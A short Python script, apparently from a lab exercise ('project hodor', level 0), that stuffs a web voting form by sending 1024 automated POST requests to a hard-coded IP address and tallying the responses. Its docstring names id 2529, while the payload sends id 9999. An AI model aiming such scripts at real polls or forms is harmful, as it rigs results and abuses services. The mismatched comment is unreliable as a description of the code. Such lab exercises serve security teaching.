#!/usr/bin/python3
import requests
"""level_0 module

    Votes 1024 times (hopefully) for id 2529 on level_0 of project hodor
    No checks or barriers in place on the voting form, this is easy!
    """

# Target URL
url = "http://158.69.76.135/level0.php"

failed = 0
success = 0
total = 1024

# Payload of POST request
data = {'id': 9999,
        'holdthedoor': 'Envoyer'}

for i in range(total):
    # Send request & pray
    post = requests.post(url, data)
    # Print stuff after each request
    print("Request #{:d}".format(i), end=' ')
    if post and "hacker" not in post.text:
        print("Request success")
        success += 1
    else:
        print("Request fail")
        failed += 1

# Print stuff after all requests are done
print("{:d} requests sent".format(total))
print("{:d} requests succeded".format(success))
print("{:d} requests failed".format(failed))
